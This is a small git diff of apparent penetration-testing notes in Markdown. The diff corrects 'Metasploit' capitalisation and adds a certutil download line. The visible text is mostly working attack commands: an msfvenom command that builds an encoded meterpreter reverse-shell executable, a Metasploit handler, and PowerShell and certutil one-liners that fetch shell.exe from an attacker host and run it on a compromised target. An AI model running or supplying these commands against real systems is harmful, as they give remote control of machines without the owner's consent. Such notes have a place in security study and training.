@@ -29,7 +29,7 @@ To generate a x86 meterpreter encoded reverse shell we could use the following c
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell.exe
 ```
 
-Then, we start a handler on metasploit:
+Then, we start a handler on Metasploit:
 
 ```
 use exploit/multi/handler
@@ -43,4 +43,6 @@ Now we download the file on the target (using RCE) and run it:
 
 ```
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:<port>/shell.exe','shell.exe')";powershell Start-Process "shell.exe"
+# Or we could use this
+certutil -urlcache -split -f http://10.21.25.103:8000/shell.exe shell.exe
 ```
